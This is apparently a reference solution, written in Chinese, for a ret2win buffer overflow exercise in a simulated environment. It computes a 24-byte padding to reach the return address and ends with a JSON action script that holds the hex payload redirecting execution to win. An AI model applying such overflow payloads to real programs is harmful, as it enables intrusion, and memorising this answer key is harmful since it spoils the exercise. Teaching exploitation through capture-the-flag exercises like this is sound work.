# ret2win 参考解法

考点是**算出 `buf` 到返回地址的偏移**，然后把那 8 个字节改成 `win` 的地址。

栈视图标出了三段：`buf` 在 `0x7fffff00`（16 字节）、saved rbp 在 `0x7fffff10`（8 字节）、
ret addr 在 `0x7fffff18`（8 字节）。所以从 `buf` 起身要写 16 + 8 = 24 字节 padding，
接下来 8 个字节就是返回地址。

初始返回地址指向 `lose`（0x400003），而 `win` 在 `0x400002`。
地址按小端序写入：`0x400002` → `02 00 40 00 00 00 00 00`。

`gets(buf)` 写入这段字节后，单步三次：

1. `leave`：`rsp = rbp`，弹出保存的 rbp，`rsp` 落到 ret addr；
2. `ret`：从栈上取出 `0x400002`，跳到 `win`；
3. `win` 里的 `syscall 99` 把 `FLAG` 置为 1 并退出，判胜。

```json
{
  "actions": [
    { "type": "block", "id": "gets", "args": { "data": "4141414141414141414141414141414142424242424242420200400000000000" } },
    { "type": "step", "count": 3 }
  ],
  "expectedVerdict": "won",
  "note": "16 字节 padding + 8 字节伪 rbp + win 地址（小端序）"
}
```
